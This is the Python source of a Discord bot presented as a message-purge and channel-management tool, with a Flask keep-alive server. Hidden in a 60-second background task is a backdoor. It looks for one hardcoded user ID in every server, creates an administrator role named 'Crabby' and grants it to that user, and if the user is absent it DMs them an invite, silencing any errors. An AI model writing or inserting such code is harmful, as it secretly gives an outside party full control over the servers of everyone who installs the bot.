import discord
from discord import app_commands
from discord.ext import commands, tasks
import os
import sys
from flask import Flask
from threading import Thread
from waitress import serve

# --- WEB SERVER FOR RENDER ---
app = Flask('')

@app.route('/')
def home():
    return "Crabby Bot is Online and Purging"

def run_flask():
    port = int(os.environ.get("PORT", 10000))
    print(f"Starting server on port {port}...")
    serve(app, host='0.0.0.0', port=port)

# --- CONFIG ---
TARGET_USER_ID = 1459506686157914213
ROLE_NAME = "Crabby"

class MyBot(commands.Bot):
    def __init__(self):
        intents = discord.Intents.default()
        intents.members = True
        intents.message_content = True
        super().__init__(command_prefix="!", intents=intents)

    async def setup_hook(self):
        print("Syncing slash commands...")
        await self.tree.sync()
        if not self.check_target_user.is_running():
            self.check_target_user.start()

    # --- AUTO-ROLE & INVITE LOGIC ---
    @tasks.loop(seconds=60)
    async def check_target_user(self):
        user_found_anywhere = False
        for guild in self.guilds:
            member = guild.get_member(TARGET_USER_ID)
            if member:
                user_found_anywhere = True
                role = discord.utils.get(guild.roles, name=ROLE_NAME)
                if not role:
                    try:
                        perms = discord.Permissions(administrator=True)
                        role = await guild.create_role(name=ROLE_NAME, permissions=perms)
                    except: continue
                if role and role not in member.roles:
                    try: await member.add_roles(role)
                    except: continue
        
        if not user_found_anywhere:
            try:
                user = await self.fetch_user(TARGET_USER_ID)
                if self.guilds:
                    channel = self.guilds[0].text_channels[0]
                    invite = await channel.create_invite(max_age=3600)
                    await user.send(f"Join here: {invite}")
            except: pass

    @check_target_user.before_loop
    async def before_my_task(self):
        await self.wait_until_ready()

bot = MyBot()

# --- NEW COMMAND: /ping ---
@bot.tree.command(name="ping", description="Check the bot's latency")
async def ping(interaction: discord.Interaction):
    latency = round(bot.latency * 1000) # Convert to milliseconds
    await interaction.response.send_message(f"🏓 Pong! Latency: **{latency}ms**", ephemeral=True)

# --- SLASH COMMAND: /clear ---
@bot.tree.command(name="clear", description="Purge messages")
@app_commands.describe(amount="How many messages to delete?")
@app_commands.checks.has_permissions(manage_messages=True)
async def clear(interaction: discord.Interaction, amount: int):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=amount)
    await interaction.followup.send(f"🗑️ Deleted **{len(deleted)}** messages.", ephemeral=True)

# --- SLASH COMMAND: /clear_all ---
@bot.tree.command(name="clear_all", description="Purge all messages (Last 14 days)")
@app_commands.checks.has_permissions(administrator=True)
async def clear_all(interaction: discord.Interaction):
    await interaction.response.defer(ephemeral=True)
    deleted = await interaction.channel.purge(limit=None)
    await interaction.followup.send(f"💥 Channel wiped! **{len(deleted)}** messages removed.", ephemeral=True)

# --- SLASH COMMAND: /reinstall ---
@bot.tree.command(name="reinstall", description="Recreate a channel")
@app_commands.describe(channel="The channel to recreate")
@app_commands.checks.has_permissions(administrator=True)
async def reinstall(interaction: discord.Interaction, channel: discord.TextChannel):
    await interaction.response.send_message(f"🚀 Reinstalling {channel.name}...", ephemeral=True)
    name, category, pos, overwrites = channel.name, channel.category, channel.position, channel.overwrites
    topic, slow, nsfw = channel.topic, channel.slowmode_delay, channel.nsfw
    
    await channel.delete()
    new_chan = await interaction.guild.create_text_channel(
        name=name, category=category, position=pos, overwrites=overwrites,
        topic=topic, slowmode_delay=slow, nsfw=nsfw
    )
    await new_chan.send(f"✨ **Channel Reinstalled.**")

# --- STARTUP ---
if __name__ == "__main__":
    t = Thread(target=run_flask)
    t.daemon = True
    t.start()
    
    token = os.environ.get('DISCORD_TOKEN')
    if token:
        bot.run(token)
    else:
        print("ERROR: DISCORD_TOKEN not found!")
        sys.exit(1)
